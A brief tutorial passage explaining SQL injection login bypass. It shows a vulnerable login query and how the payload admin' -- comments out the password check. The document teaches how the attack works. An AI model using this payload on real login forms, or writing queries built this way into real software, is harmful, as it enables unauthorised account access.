# SQL Injection
## Login bypass, password compared in query

Normal COde
```sql

SELECT * FROM `users` WHERE `users.username` = '' AND `users.password` = ''
```
### Lets begin Our SQL injection and see how this will change the normal code
1) admin' --
 When this is supplied, our code becomes. Notice it will only execute upto the closing quotes on admin ('admin'). The res of the querry is commented out. This will return true if there is a user by that name on our database

```sql
SELECT * FROM `users` WHERE `users.username` = 'admin' --' AND `users.password` = ''
```
